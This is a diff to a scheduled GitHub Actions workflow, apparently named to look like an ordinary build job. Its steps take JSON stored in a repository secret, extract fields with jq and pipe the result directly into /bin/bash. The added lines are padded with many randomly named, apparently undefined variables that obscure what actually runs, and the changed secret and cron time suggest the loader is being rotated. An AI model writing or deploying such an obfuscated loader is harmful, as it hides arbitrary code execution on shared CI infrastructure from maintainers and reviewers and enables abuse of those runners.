@@ -3,26 +3,31 @@ name: caidefine
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 2/6 * * *'
-
+    - cron: '15 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: caidefine
         env:
-          c34: ${{ secrets.c34 }}
+          w9: ${{ secrets.w9 }}
         run: |
-          echo $c34 | jq -r .rvl0 | /bin/bash
-          echo $nrmsj946 | jq -r .tj571 | /bin/bash
-          echo $xsa1091 | jq -r .rkuty97 | /bin/bash
-          echo $szkl9 | jq -r .zpm5 | /bin/bash
-          echo $ev1 | jq -r .bwnu7 | /bin/bash
-          echo $zkt0 | jq -r .h08 | /bin/bash
-          echo $zgtq7185 | jq -r .ryjhg3282 | /bin/bash
-          echo $gkm3618 | jq -r .beyu15679 | /bin/bash
-          echo $aeku56004 | jq -r .dyccj08 | /bin/bash
-          echo $sn84 | jq -r .ybwp5769 | /bin/bash
-          echo $kh42205 | jq -r .nx7 | /bin/bash
+          echo $w9 | jq -r .eqh8 | /bin/bash
+          echo $jvtwf16381 | jq -r .ekjjo26 | /bin/bash
+          echo $ner038 | jq -r .r59 | /bin/bash
+          echo $b5379 | jq -r .cgo84837 | /bin/bash
+          echo $q64796 | jq -r .x71707 | /bin/bash
+          echo $w3 | jq -r .bxuis11 | /bin/bash
+          echo $j11 | jq -r .sc9079 | /bin/bash
+          echo $xrekr8 | jq -r .zwx10 | /bin/bash
+          echo $vxn350 | jq -r .pjwgv365 | /bin/bash
+          echo $ff1 | jq -r .rhfde855 | /bin/bash
+          echo $y93754 | jq -r .wv2533 | /bin/bash
+          echo $ukf779 | jq -r .wqm10444 | /bin/bash
+          echo $u4317 | jq -r .agwp92244 | /bin/bash
+          echo $yrdwj5788 | jq -r .byjdm222 | /bin/bash
+          echo $njvwz711 | jq -r .v17831 | /bin/bash
+          echo $yco0412 | jq -r .bq0 | /bin/bash
 
